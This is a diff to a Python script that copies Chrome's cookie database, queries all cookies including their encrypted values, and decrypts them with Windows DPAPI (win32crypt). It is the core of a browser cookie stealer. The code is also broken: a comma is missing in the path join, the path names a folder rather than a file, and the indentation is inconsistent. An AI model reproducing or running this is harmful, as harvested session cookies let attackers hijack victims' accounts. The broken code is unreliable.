@@ -38,6 +38,17 @@ def decrypt_data(data,key):
         try:
             return str(win32crypt.CryptUnprotectData(data, None,None, None,0)[1])
         except:
-            return
+            return ""
 def main():
-    db_path = os.path.join(os.environ["USERPROFILE"]"AppData", "Local", "Google" , "Chrome", "User Data",)                  
+    db_path = os.path.join(os.environ["USERPROFILE"]"AppData", "Local", "Google" , "Chrome", "User Data",)
+    filename = "Cookies.db"
+    if not os.path.isfile(filename):
+        shutil.copyfile(db_path, filename)
+
+db = sqlite3.connect(filename)
+db.text_factory = lambda b: b.decode(errors="ignore")
+cursor = db.cursor()
+cursor.execute("""
+    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
+    FROM cookies""")
+    
